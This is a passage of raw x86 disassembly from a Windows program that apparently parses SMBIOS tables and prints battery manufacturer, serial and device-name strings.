  403dbf:	89 b5 64 f7 ff ff    	mov    %esi,-0x89c(%ebp)
  403dc5:	0f 57 c0             	xorps  %xmm0,%xmm0
  403dc8:	66 0f d6 85 dc f7 ff 	movq   %xmm0,-0x824(%ebp)
  403dcf:	ff 
  403dd0:	c7 85 e4 f7 ff ff 00 	movl   $0x0,-0x81c(%ebp)
  403dd7:	00 00 00 
  403dda:	c7 85 dc f7 ff ff 00 	movl   $0x0,-0x824(%ebp)
  403de1:	00 00 00 
  403de4:	c7 85 e0 f7 ff ff 00 	movl   $0x0,-0x820(%ebp)
  403deb:	00 00 00 
  403dee:	c7 85 e4 f7 ff ff 00 	movl   $0x0,-0x81c(%ebp)
  403df5:	00 00 00 
  403df8:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403dff:	0f 11 85 bc f7 ff ff 	movups %xmm0,-0x844(%ebp)
  403e06:	c7 85 bc f7 ff ff 00 	movl   $0x0,-0x844(%ebp)
  403e0d:	00 00 00 
  403e10:	0f 11 85 cc f7 ff ff 	movups %xmm0,-0x834(%ebp)
  403e17:	c7 85 c0 f7 ff ff 00 	movl   $0x0,-0x840(%ebp)
  403e1e:	00 00 00 
  403e21:	c7 85 c4 f7 ff ff 00 	movl   $0x0,-0x83c(%ebp)
  403e28:	00 00 00 
  403e2b:	c7 85 cc f7 ff ff 00 	movl   $0x0,-0x834(%ebp)
  403e32:	00 00 00 
  403e35:	c7 85 d0 f7 ff ff 00 	movl   $0x0,-0x830(%ebp)
  403e3c:	00 00 00 
  403e3f:	c7 85 d4 f7 ff ff 00 	movl   $0x0,-0x82c(%ebp)
  403e46:	00 00 00 
  403e49:	8d 8d bc f7 ff ff    	lea    -0x844(%ebp),%ecx
  403e4f:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  403e53:	e8 58 d8 ff ff       	call   0x4016b0
  403e58:	84 c0                	test   %al,%al
  403e5a:	0f 85 b0 00 00 00    	jne    0x403f10
  403e60:	8b 85 dc f7 ff ff    	mov    -0x824(%ebp),%eax
  403e66:	8b 8d cc f7 ff ff    	mov    -0x834(%ebp),%ecx
  403e6c:	89 06                	mov    %eax,(%esi)
  403e6e:	8b 85 e0 f7 ff ff    	mov    -0x820(%ebp),%eax
  403e74:	89 46 04             	mov    %eax,0x4(%esi)
  403e77:	8b 85 e4 f7 ff ff    	mov    -0x81c(%ebp),%eax
  403e7d:	89 46 08             	mov    %eax,0x8(%esi)
  403e80:	c7 85 dc f7 ff ff 00 	movl   $0x0,-0x824(%ebp)
  403e87:	00 00 00 
  403e8a:	c7 85 e0 f7 ff ff 00 	movl   $0x0,-0x820(%ebp)
  403e91:	00 00 00 
  403e94:	c7 85 e4 f7 ff ff 00 	movl   $0x0,-0x81c(%ebp)
  403e9b:	00 00 00 
  403e9e:	85 c9                	test   %ecx,%ecx
  403ea0:	74 30                	je     0x403ed2
  403ea2:	8b 95 d4 f7 ff ff    	mov    -0x82c(%ebp),%edx
  403ea8:	8b c1                	mov    %ecx,%eax
  403eaa:	2b d1                	sub    %ecx,%edx
  403eac:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  403eb2:	72 14                	jb     0x403ec8
  403eb4:	8b 49 fc             	mov    -0x4(%ecx),%ecx
  403eb7:	83 c2 23             	add    $0x23,%edx
  403eba:	2b c1                	sub    %ecx,%eax
  403ebc:	83 c0 fc             	add    $0xfffffffc,%eax
  403ebf:	83 f8 1f             	cmp    $0x1f,%eax
  403ec2:	0f 87 18 05 00 00    	ja     0x4043e0
  403ec8:	52                   	push   %edx
  403ec9:	51                   	push   %ecx
  403eca:	e8 3d 83 00 00       	call   0x40c20c
  403ecf:	83 c4 08             	add    $0x8,%esp
  403ed2:	8b 95 bc f7 ff ff    	mov    -0x844(%ebp),%edx
  403ed8:	85 d2                	test   %edx,%edx
  403eda:	0f 84 d5 04 00 00    	je     0x4043b5
  403ee0:	8b 8d c4 f7 ff ff    	mov    -0x83c(%ebp),%ecx
  403ee6:	8b c2                	mov    %edx,%eax
  403ee8:	2b ca                	sub    %edx,%ecx
  403eea:	83 e1 fc             	and    $0xfffffffc,%ecx
  403eed:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  403ef3:	72 14                	jb     0x403f09
  403ef5:	8b 52 fc             	mov    -0x4(%edx),%edx
  403ef8:	83 c1 23             	add    $0x23,%ecx
  403efb:	2b c2                	sub    %edx,%eax
  403efd:	83 c0 fc             	add    $0xfffffffc,%eax
  403f00:	83 f8 1f             	cmp    $0x1f,%eax
  403f03:	0f 87 dc 04 00 00    	ja     0x4043e5
  403f09:	51                   	push   %ecx
  403f0a:	52                   	push   %edx
  403f0b:	e9 9d 04 00 00       	jmp    0x4043ad
  403f10:	8b b5 d8 f7 ff ff    	mov    -0x828(%ebp),%esi
  403f16:	8b 95 cc f7 ff ff    	mov    -0x834(%ebp),%edx
  403f1c:	8b bd bc f7 ff ff    	mov    -0x844(%ebp),%edi
  403f22:	8b 85 d0 f7 ff ff    	mov    -0x830(%ebp),%eax
  403f28:	3b d0                	cmp    %eax,%edx
  403f2a:	74 4f                	je     0x403f7b
  403f2c:	85 f6                	test   %esi,%esi
  403f2e:	74 4b                	je     0x403f7b
  403f30:	3b f2                	cmp    %edx,%esi
  403f32:	72 47                	jb     0x403f7b
  403f34:	8d 48 ff             	lea    -0x1(%eax),%ecx
  403f37:	3b f1                	cmp    %ecx,%esi
  403f39:	73 40                	jae    0x403f7b
  403f3b:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  403f3f:	03 c6                	add    %esi,%eax
  403f41:	66 83 38 00          	cmpw   $0x0,(%eax)
  403f45:	74 07                	je     0x403f4e
  403f47:	40                   	inc    %eax
  403f48:	66 83 38 00          	cmpw   $0x0,(%eax)
  403f4c:	75 f9                	jne    0x403f47
  403f4e:	83 c0 02             	add    $0x2,%eax
  403f51:	3b c1                	cmp    %ecx,%eax
  403f53:	0f 82 a2 02 00 00    	jb     0x4041fb
  403f59:	8b 85 c8 f7 ff ff    	mov    -0x838(%ebp),%eax
  403f5f:	8b 8d c0 f7 ff ff    	mov    -0x840(%ebp),%ecx
  403f65:	2b cf                	sub    %edi,%ecx
  403f67:	c1 f9 02             	sar    $0x2,%ecx
  403f6a:	8d 50 01             	lea    0x1(%eax),%edx
  403f6d:	3b ca                	cmp    %edx,%ecx
  403f6f:	0f 87 df 01 00 00    	ja     0x404154
  403f75:	8b 95 cc f7 ff ff    	mov    -0x834(%ebp),%edx
  403f7b:	32 c0                	xor    %al,%al
  403f7d:	84 c0                	test   %al,%al
  403f7f:	0f 84 8f 03 00 00    	je     0x404314
  403f85:	80 3e 16             	cmpb   $0x16,(%esi)
  403f88:	75 98                	jne    0x403f22
  403f8a:	33 c0                	xor    %eax,%eax
  403f8c:	c7 85 7c f7 ff ff 00 	movl   $0x0,-0x884(%ebp)
  403f93:	00 00 00 
  403f96:	c7 85 80 f7 ff ff 07 	movl   $0x7,-0x880(%ebp)
  403f9d:	00 00 00 
  403fa0:	66 89 85 6c f7 ff ff 	mov    %ax,-0x894(%ebp)
  403fa7:	89 85 94 f7 ff ff    	mov    %eax,-0x86c(%ebp)
  403fad:	c7 85 98 f7 ff ff 07 	movl   $0x7,-0x868(%ebp)
  403fb4:	00 00 00 
  403fb7:	66 89 85 84 f7 ff ff 	mov    %ax,-0x87c(%ebp)
  403fbe:	89 85 ac f7 ff ff    	mov    %eax,-0x854(%ebp)
  403fc4:	c7 85 b0 f7 ff ff 07 	movl   $0x7,-0x850(%ebp)
  403fcb:	00 00 00 
  403fce:	66 89 85 9c f7 ff ff 	mov    %ax,-0x864(%ebp)
  403fd5:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403fd9:	0f b6 7e 01          	movzbl 0x1(%esi),%edi
  403fdd:	8a 46 05             	mov    0x5(%esi),%al
  403fe0:	03 fe                	add    %esi,%edi
  403fe2:	8b d7                	mov    %edi,%edx
  403fe4:	3c 01                	cmp    $0x1,%al
  403fe6:	76 33                	jbe    0x40401b
  403fe8:	fe c8                	dec    %al
  403fea:	0f b6 f0             	movzbl %al,%esi
  403fed:	0f 1f 00             	nopl   (%eax)
  403ff0:	8b ca                	mov    %edx,%ecx
  403ff2:	8d 41 01             	lea    0x1(%ecx),%eax
  403ff5:	89 85 64 f7 ff ff    	mov    %eax,-0x89c(%ebp)
  403ffb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  404000:	8a 01                	mov    (%ecx),%al
  404002:	41                   	inc    %ecx
  404003:	84 c0                	test   %al,%al
  404005:	75 f9                	jne    0x404000
  404007:	2b 8d 64 f7 ff ff    	sub    -0x89c(%ebp),%ecx
  40400d:	42                   	inc    %edx
  40400e:	03 d1                	add    %ecx,%edx
  404010:	83 ee 01             	sub    $0x1,%esi
  404013:	75 db                	jne    0x403ff0
  404015:	8b b5 d8 f7 ff ff    	mov    -0x828(%ebp),%esi
  40401b:	52                   	push   %edx
  40401c:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  404022:	68 d0 6f 42 00       	push   $0x426fd0
  404027:	50                   	push   %eax
  404028:	e8 83 05 00 00       	call   0x4045b0
  40402d:	83 c4 0c             	add    $0xc,%esp
  404030:	66 83 bd e8 f7 ff ff 	cmpw   $0x0,-0x818(%ebp)
  404037:	00 
  404038:	0f 84 02 01 00 00    	je     0x404140
  40403e:	8d 8d e8 f7 ff ff    	lea    -0x818(%ebp),%ecx
  404044:	8d 51 02             	lea    0x2(%ecx),%edx
  404047:	66 8b 01             	mov    (%ecx),%ax
  40404a:	83 c1 02             	add    $0x2,%ecx
  40404d:	66 85 c0             	test   %ax,%ax
  404050:	75 f5                	jne    0x404047
  404052:	2b ca                	sub    %edx,%ecx
  404054:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  40405a:	d1 f9                	sar    $1,%ecx
  40405c:	51                   	push   %ecx
  40405d:	50                   	push   %eax
  40405e:	8d 8d 6c f7 ff ff    	lea    -0x894(%ebp),%ecx
  404064:	e8 b7 d2 ff ff       	call   0x401320
  404069:	8a 46 07             	mov    0x7(%esi),%al
  40406c:	8b d7                	mov    %edi,%edx
  40406e:	3c 01                	cmp    $0x1,%al
  404070:	76 39                	jbe    0x4040ab
  404072:	fe c8                	dec    %al
  404074:	0f b6 f0             	movzbl %al,%esi
  404077:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  40407e:	00 00 
  404080:	8b ca                	mov    %edx,%ecx
  404082:	8d 41 01             	lea    0x1(%ecx),%eax
  404085:	89 85 64 f7 ff ff    	mov    %eax,-0x89c(%ebp)
  40408b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  404090:	8a 01                	mov    (%ecx),%al
  404092:	41                   	inc    %ecx
  404093:	84 c0                	test   %al,%al
  404095:	75 f9                	jne    0x404090
  404097:	2b 8d 64 f7 ff ff    	sub    -0x89c(%ebp),%ecx
  40409d:	42                   	inc    %edx
  40409e:	03 d1                	add    %ecx,%edx
  4040a0:	83 ee 01             	sub    $0x1,%esi
  4040a3:	75 db                	jne    0x404080
  4040a5:	8b b5 d8 f7 ff ff    	mov    -0x828(%ebp),%esi
  4040ab:	52                   	push   %edx
  4040ac:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  4040b2:	68 d0 6f 42 00       	push   $0x426fd0
  4040b7:	50                   	push   %eax
  4040b8:	e8 f3 04 00 00       	call   0x4045b0
  4040bd:	83 c4 0c             	add    $0xc,%esp
  4040c0:	66 83 bd e8 f7 ff ff 	cmpw   $0x0,-0x818(%ebp)
  4040c7:	00 
  4040c8:	74 76                	je     0x404140
  4040ca:	8d 8d e8 f7 ff ff    	lea    -0x818(%ebp),%ecx
  4040d0:	8d 51 02             	lea    0x2(%ecx),%edx
  4040d3:	66 8b 01             	mov    (%ecx),%ax
  4040d6:	83 c1 02             	add    $0x2,%ecx
  4040d9:	66 85 c0             	test   %ax,%ax
  4040dc:	75 f5                	jne    0x4040d3
  4040de:	2b ca                	sub    %edx,%ecx
  4040e0:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  4040e6:	d1 f9                	sar    $1,%ecx
  4040e8:	51                   	push   %ecx
  4040e9:	50                   	push   %eax
  4040ea:	8d 8d 9c f7 ff ff    	lea    -0x864(%ebp),%ecx
  4040f0:	e8 2b d2 ff ff       	call   0x401320
  4040f5:	8a 46 08             	mov    0x8(%esi),%al
  4040f8:	3c 01                	cmp    $0x1,%al
  4040fa:	76 21                	jbe    0x40411d
  4040fc:	fe c8                	dec    %al
  4040fe:	0f b6 d0             	movzbl %al,%edx
  404101:	8b c7                	mov    %edi,%eax
  404103:	8d 70 01             	lea    0x1(%eax),%esi
  404106:	8a 08                	mov    (%eax),%cl
  404108:	40                   	inc    %eax
  404109:	84 c9                	test   %cl,%cl
  40410b:	75 f9                	jne    0x404106
  40410d:	2b c6                	sub    %esi,%eax
  40410f:	47                   	inc    %edi
  404110:	03 f8                	add    %eax,%edi
  404112:	83 ea 01             	sub    $0x1,%edx
  404115:	75 ea                	jne    0x404101
  404117:	8b b5 d8 f7 ff ff    	mov    -0x828(%ebp),%esi
  40411d:	57                   	push   %edi
  40411e:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  404124:	68 d0 6f 42 00       	push   $0x426fd0
  404129:	50                   	push   %eax
  40412a:	e8 81 04 00 00       	call   0x4045b0
  40412f:	83 c4 0c             	add    $0xc,%esp
  404132:	66 83 bd e8 f7 ff ff 	cmpw   $0x0,-0x818(%ebp)
  404139:	00 
  40413a:	0f 85 ca 00 00 00    	jne    0x40420a
  404140:	8d 8d 68 f7 ff ff    	lea    -0x898(%ebp),%ecx
  404146:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40414a:	e8 d1 f6 ff ff       	call   0x403820
  40414f:	e9 c2 fd ff ff       	jmp    0x403f16
  404154:	89 95 c8 f7 ff ff    	mov    %edx,-0x838(%ebp)
  40415a:	8d 8d 54 f7 ff ff    	lea    -0x8ac(%ebp),%ecx
  404160:	8b 14 97             	mov    (%edi,%edx,4),%edx
  404163:	e8 c8 d6 ff ff       	call   0x401830
  404168:	50                   	push   %eax
  404169:	8d 8d cc f7 ff ff    	lea    -0x834(%ebp),%ecx
  40416f:	e8 fc d7 ff ff       	call   0x401970
  404174:	8b 8d 54 f7 ff ff    	mov    -0x8ac(%ebp),%ecx
  40417a:	85 c9                	test   %ecx,%ecx
  40417c:	74 4e                	je     0x4041cc
  40417e:	8b 95 5c f7 ff ff    	mov    -0x8a4(%ebp),%edx
  404184:	8b c1                	mov    %ecx,%eax
  404186:	2b d1                	sub    %ecx,%edx
  404188:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  40418e:	72 14                	jb     0x4041a4
  404190:	8b 49 fc             	mov    -0x4(%ecx),%ecx
  404193:	83 c2 23             	add    $0x23,%edx
  404196:	2b c1                	sub    %ecx,%eax
  404198:	83 c0 fc             	add    $0xfffffffc,%eax
  40419b:	83 f8 1f             	cmp    $0x1f,%eax
  40419e:	0f 87 3c 02 00 00    	ja     0x4043e0
  4041a4:	52                   	push   %edx
  4041a5:	51                   	push   %ecx
  4041a6:	e8 61 80 00 00       	call   0x40c20c
  4041ab:	83 c4 08             	add    $0x8,%esp
  4041ae:	c7 85 54 f7 ff ff 00 	movl   $0x0,-0x8ac(%ebp)
  4041b5:	00 00 00 
  4041b8:	c7 85 58 f7 ff ff 00 	movl   $0x0,-0x8a8(%ebp)
  4041bf:	00 00 00 
  4041c2:	c7 85 5c f7 ff ff 00 	movl   $0x0,-0x8a4(%ebp)
  4041c9:	00 00 00 
  4041cc:	8b 95 cc f7 ff ff    	mov    -0x834(%ebp),%edx
  4041d2:	8b bd bc f7 ff ff    	mov    -0x844(%ebp),%edi
  4041d8:	3b 95 d0 f7 ff ff    	cmp    -0x830(%ebp),%edx
  4041de:	75 0b                	jne    0x4041eb
  4041e0:	8b b5 d8 f7 ff ff    	mov    -0x828(%ebp),%esi
  4041e6:	e9 90 fd ff ff       	jmp    0x403f7b
  4041eb:	8d 72 08             	lea    0x8(%edx),%esi
  4041ee:	b0 01                	mov    $0x1,%al
  4041f0:	89 b5 d8 f7 ff ff    	mov    %esi,-0x828(%ebp)
  4041f6:	e9 82 fd ff ff       	jmp    0x403f7d
  4041fb:	8b f0                	mov    %eax,%esi
  4041fd:	b0 01                	mov    $0x1,%al
  4041ff:	89 b5 d8 f7 ff ff    	mov    %esi,-0x828(%ebp)
  404205:	e9 73 fd ff ff       	jmp    0x403f7d
  40420a:	8d 8d e8 f7 ff ff    	lea    -0x818(%ebp),%ecx
  404210:	8d 51 02             	lea    0x2(%ecx),%edx
  404213:	66 8b 01             	mov    (%ecx),%ax
  404216:	83 c1 02             	add    $0x2,%ecx
  404219:	66 85 c0             	test   %ax,%ax
  40421c:	75 f5                	jne    0x404213
  40421e:	2b ca                	sub    %edx,%ecx
  404220:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  404226:	d1 f9                	sar    $1,%ecx
  404228:	51                   	push   %ecx
  404229:	50                   	push   %eax
  40422a:	8d 8d 84 f7 ff ff    	lea    -0x87c(%ebp),%ecx
  404230:	e8 eb d0 ff ff       	call   0x401320
  404235:	8b b5 e0 f7 ff ff    	mov    -0x820(%ebp),%esi
  40423b:	c6 85 68 f7 ff ff 01 	movb   $0x1,-0x898(%ebp)
  404242:	39 b5 e4 f7 ff ff    	cmp    %esi,-0x81c(%ebp)
  404248:	74 4b                	je     0x404295
  40424a:	8d 85 6c f7 ff ff    	lea    -0x894(%ebp),%eax
  404250:	89 b5 64 f7 ff ff    	mov    %esi,-0x89c(%ebp)
  404256:	50                   	push   %eax
  404257:	8d 4e 04             	lea    0x4(%esi),%ecx
  40425a:	c6 06 01             	movb   $0x1,(%esi)
  40425d:	e8 be ef ff ff       	call   0x403220
  404262:	8d 85 84 f7 ff ff    	lea    -0x87c(%ebp),%eax
  404268:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  40426c:	50                   	push   %eax
  40426d:	8d 4e 1c             	lea    0x1c(%esi),%ecx
  404270:	e8 ab ef ff ff       	call   0x403220
  404275:	8d 85 9c f7 ff ff    	lea    -0x864(%ebp),%eax
  40427b:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  40427f:	50                   	push   %eax
  404280:	8d 4e 34             	lea    0x34(%esi),%ecx
  404283:	e8 98 ef ff ff       	call   0x403220
  404288:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40428c:	83 85 e0 f7 ff ff 4c 	addl   $0x4c,-0x820(%ebp)
  404293:	eb 13                	jmp    0x4042a8
  404295:	8d 85 68 f7 ff ff    	lea    -0x898(%ebp),%eax
  40429b:	50                   	push   %eax
  40429c:	56                   	push   %esi
  40429d:	8d 8d dc f7 ff ff    	lea    -0x824(%ebp),%ecx
  4042a3:	e8 28 03 00 00       	call   0x4045d0
  4042a8:	83 bd b0 f7 ff ff 08 	cmpl   $0x8,-0x850(%ebp)
  4042af:	8d 95 9c f7 ff ff    	lea    -0x864(%ebp),%edx
  4042b5:	8d 8d 6c f7 ff ff    	lea    -0x894(%ebp),%ecx
  4042bb:	0f 43 95 9c f7 ff ff 	cmovae -0x864(%ebp),%edx
  4042c2:	8d 85 84 f7 ff ff    	lea    -0x87c(%ebp),%eax
  4042c8:	83 bd 80 f7 ff ff 08 	cmpl   $0x8,-0x880(%ebp)
  4042cf:	52                   	push   %edx
  4042d0:	0f 43 8d 6c f7 ff ff 	cmovae -0x894(%ebp),%ecx
  4042d7:	83 bd 98 f7 ff ff 08 	cmpl   $0x8,-0x868(%ebp)
  4042de:	51                   	push   %ecx
  4042df:	0f 43 85 84 f7 ff ff 	cmovae -0x87c(%ebp),%eax
  4042e6:	33 c9                	xor    %ecx,%ecx
  4042e8:	50                   	push   %eax
  4042e9:	68 d8 6f 42 00       	push   $0x426fd8
  4042ee:	6a 14                	push   $0x14
  4042f0:	6a 03                	push   $0x3
  4042f2:	e8 39 42 00 00       	call   0x408530
  4042f7:	50                   	push   %eax
  4042f8:	e8 73 43 00 00       	call   0x408670
  4042fd:	83 c4 1c             	add    $0x1c,%esp
  404300:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  404304:	8d 8d 68 f7 ff ff    	lea    -0x898(%ebp),%ecx
  40430a:	e8 11 f5 ff ff       	call   0x403820
  40430f:	e9 fc fb ff ff       	jmp    0x403f10
  404314:	8b b5 60 f7 ff ff    	mov    -0x8a0(%ebp),%esi
  40431a:	8b 85 dc f7 ff ff    	mov    -0x824(%ebp),%eax
  404320:	c7 85 dc f7 ff ff 00 	movl   $0x0,-0x824(%ebp)
  404327:	00 00 00 
  40432a:	89 06                	mov    %eax,(%esi)
  40432c:	8b 85 e0 f7 ff ff    	mov    -0x820(%ebp),%eax
  404332:	89 46 04             	mov    %eax,0x4(%esi)
  404335:	8b 85 e4 f7 ff ff    	mov    -0x81c(%ebp),%eax
  40433b:	89 46 08             	mov    %eax,0x8(%esi)
  40433e:	c7 85 e0 f7 ff ff 00 	movl   $0x0,-0x820(%ebp)
  404345:	00 00 00 
  404348:	c7 85 e4 f7 ff ff 00 	movl   $0x0,-0x81c(%ebp)
  40434f:	00 00 00 
  404352:	85 d2                	test   %edx,%edx
  404354:	74 2c                	je     0x404382
  404356:	8b 8d d4 f7 ff ff    	mov    -0x82c(%ebp),%ecx
  40435c:	8b c2                	mov    %edx,%eax
  40435e:	2b ca                	sub    %edx,%ecx
  404360:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404366:	72 10                	jb     0x404378
  404368:	8b 52 fc             	mov    -0x4(%edx),%edx
  40436b:	83 c1 23             	add    $0x23,%ecx
  40436e:	2b c2                	sub    %edx,%eax
  404370:	83 c0 fc             	add    $0xfffffffc,%eax
  404373:	83 f8 1f             	cmp    $0x1f,%eax
  404376:	77 72                	ja     0x4043ea
  404378:	51                   	push   %ecx
  404379:	52                   	push   %edx
  40437a:	e8 8d 7e 00 00       	call   0x40c20c
  40437f:	83 c4 08             	add    $0x8,%esp
  404382:	85 ff                	test   %edi,%edi
  404384:	74 2f                	je     0x4043b5
  404386:	8b 8d c4 f7 ff ff    	mov    -0x83c(%ebp),%ecx
  40438c:	8b c7                	mov    %edi,%eax
  40438e:	2b cf                	sub    %edi,%ecx
  404390:	83 e1 fc             	and    $0xfffffffc,%ecx
  404393:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404399:	72 10                	jb     0x4043ab
  40439b:	8b 7f fc             	mov    -0x4(%edi),%edi
  40439e:	83 c1 23             	add    $0x23,%ecx
  4043a1:	2b c7                	sub    %edi,%eax
  4043a3:	83 c0 fc             	add    $0xfffffffc,%eax
  4043a6:	83 f8 1f             	cmp    $0x1f,%eax
  4043a9:	77 44                	ja     0x4043ef
  4043ab:	51                   	push   %ecx
  4043ac:	57                   	push   %edi
  4043ad:	e8 5a 7e 00 00       	call   0x40c20c
  4043b2:	83 c4 08             	add    $0x8,%esp
  4043b5:	8d 8d dc f7 ff ff    	lea    -0x824(%ebp),%ecx
  4043bb:	e8 00 01 00 00       	call   0x4044c0
  4043c0:	8b c6                	mov    %esi,%eax
  4043c2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4043c5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4043cc:	59                   	pop    %ecx
  4043cd:	5f                   	pop    %edi
  4043ce:	5e                   	pop    %esi
  4043cf:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4043d2:	33 cd                	xor    %ebp,%ecx
  4043d4:	e8 22 7e 00 00       	call   0x40c1fb
  4043d9:	8b e5                	mov    %ebp,%esp
  4043db:	5d                   	pop    %ebp
  4043dc:	8b e3                	mov    %ebx,%esp
  4043de:	5b                   	pop    %ebx
  4043df:	c3                   	ret
  4043e0:	e8 b4 bd 00 00       	call   0x410199
  4043e5:	e8 af bd 00 00       	call   0x410199
  4043ea:	e8 aa bd 00 00       	call   0x410199
  4043ef:	e8 a5 bd 00 00       	call   0x410199
  4043f4:	cc                   	int3
  4043f5:	cc                   	int3
  4043f6:	cc                   	int3
  4043f7:	cc                   	int3
  4043f8:	cc                   	int3
  4043f9:	cc                   	int3
  4043fa:	cc                   	int3
  4043fb:	cc                   	int3
  4043fc:	cc                   	int3
  4043fd:	cc                   	int3
  4043fe:	cc                   	int3
  4043ff:	cc                   	int3
  404400:	56                   	push   %esi
  404401:	8b f1                	mov    %ecx,%esi
  404403:	8b 46 10             	mov    0x10(%esi),%eax
  404406:	85 c0                	test   %eax,%eax
  404408:	74 3e                	je     0x404448
  40440a:	8b 4e 18             	mov    0x18(%esi),%ecx
  40440d:	2b c8                	sub    %eax,%ecx
  40440f:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404415:	72 12                	jb     0x404429
  404417:	8b 50 fc             	mov    -0x4(%eax),%edx
  40441a:	83 c1 23             	add    $0x23,%ecx
  40441d:	2b c2                	sub    %edx,%eax
  40441f:	83 c0 fc             	add    $0xfffffffc,%eax
  404422:	83 f8 1f             	cmp    $0x1f,%eax
  404425:	77 69                	ja     0x404490
  404427:	8b c2                	mov    %edx,%eax
  404429:	51                   	push   %ecx
  40442a:	50                   	push   %eax
  40442b:	e8 dc 7d 00 00       	call   0x40c20c
  404430:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  404437:	83 c4 08             	add    $0x8,%esp
  40443a:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  404441:	c7 46 18 00 00 00 00 	movl   $0x0,0x18(%esi)
  404448:	8b 06                	mov    (%esi),%eax
  40444a:	85 c0                	test   %eax,%eax
  40444c:	74 40                	je     0x40448e
  40444e:	8b 4e 08             	mov    0x8(%esi),%ecx
  404451:	2b c8                	sub    %eax,%ecx
  404453:	83 e1 fc             	and    $0xfffffffc,%ecx
  404456:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40445c:	72 12                	jb     0x404470
  40445e:	8b 50 fc             	mov    -0x4(%eax),%edx
  404461:	83 c1 23             	add    $0x23,%ecx
  404464:	2b c2                	sub    %edx,%eax
  404466:	83 c0 fc             	add    $0xfffffffc,%eax
  404469:	83 f8 1f             	cmp    $0x1f,%eax
  40446c:	77 22                	ja     0x404490
  40446e:	8b c2                	mov    %edx,%eax
  404470:	51                   	push   %ecx
  404471:	50                   	push   %eax
  404472:	e8 95 7d 00 00       	call   0x40c20c
  404477:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40447d:	83 c4 08             	add    $0x8,%esp
  404480:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  404487:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40448e:	5e                   	pop    %esi
  40448f:	c3                   	ret
  404490:	e8 04 bd 00 00       	call   0x410199
  404495:	cc                   	int3
  404496:	cc                   	int3
  404497:	cc                   	int3
  404498:	cc                   	int3
  404499:	cc                   	int3
  40449a:	cc                   	int3
  40449b:	cc                   	int3
  40449c:	cc                   	int3
  40449d:	cc                   	int3
  40449e:	cc                   	int3
  40449f:	cc                   	int3
  4044a0:	e9 1b 00 00 00       	jmp    0x4044c0
  4044a5:	cc                   	int3
  4044a6:	cc                   	int3
  4044a7:	cc                   	int3
  4044a8:	cc                   	int3
  4044a9:	cc                   	int3
  4044aa:	cc                   	int3
  4044ab:	cc                   	int3
  4044ac:	cc                   	int3
  4044ad:	cc                   	int3
  4044ae:	cc                   	int3
  4044af:	cc                   	int3
  4044b0:	8d 41 04             	lea    0x4(%ecx),%eax
  4044b3:	c3                   	ret
  4044b4:	cc                   	int3
  4044b5:	cc                   	int3
  4044b6:	cc                   	int3
  4044b7:	cc                   	int3
  4044b8:	cc                   	int3
  4044b9:	cc                   	int3
  4044ba:	cc                   	int3
  4044bb:	cc                   	int3
  4044bc:	cc                   	int3
  4044bd:	cc                   	int3
  4044be:	cc                   	int3
  4044bf:	cc                   	int3
  4044c0:	56                   	push   %esi
  4044c1:	57                   	push   %edi
  4044c2:	8b f9                	mov    %ecx,%edi
  4044c4:	8b 37                	mov    (%edi),%esi
  4044c6:	85 f6                	test   %esi,%esi
  4044c8:	74 69                	je     0x404533
  4044ca:	53                   	push   %ebx
  4044cb:	8b 5f 04             	mov    0x4(%edi),%ebx
  4044ce:	3b f3                	cmp    %ebx,%esi
  4044d0:	74 10                	je     0x4044e2
  4044d2:	8b ce                	mov    %esi,%ecx
  4044d4:	e8 47 f3 ff ff       	call   0x403820
  4044d9:	83 c6 4c             	add    $0x4c,%esi
  4044dc:	3b f3                	cmp    %ebx,%esi
  4044de:	75 f2                	jne    0x4044d2
  4044e0:	8b 37                	mov    (%edi),%esi
  4044e2:	8b 4f 08             	mov    0x8(%edi),%ecx
  4044e5:	b8 f3 1a ca 6b       	mov    $0x6bca1af3,%eax
  4044ea:	2b ce                	sub    %esi,%ecx
  4044ec:	f7 e9                	imul   %ecx
  4044ee:	5b                   	pop    %ebx
  4044ef:	c1 fa 05             	sar    $0x5,%edx
  4044f2:	8b c2                	mov    %edx,%eax
  4044f4:	c1 e8 1f             	shr    $0x1f,%eax
  4044f7:	03 c2                	add    %edx,%eax
  4044f9:	6b c0 4c             	imul   $0x4c,%eax,%eax
  4044fc:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404501:	72 12                	jb     0x404515
  404503:	8b 4e fc             	mov    -0x4(%esi),%ecx
  404506:	83 c0 23             	add    $0x23,%eax
  404509:	2b f1                	sub    %ecx,%esi
  40450b:	83 c6 fc             	add    $0xfffffffc,%esi
  40450e:	83 fe 1f             	cmp    $0x1f,%esi
  404511:	77 23                	ja     0x404536
  404513:	8b f1                	mov    %ecx,%esi
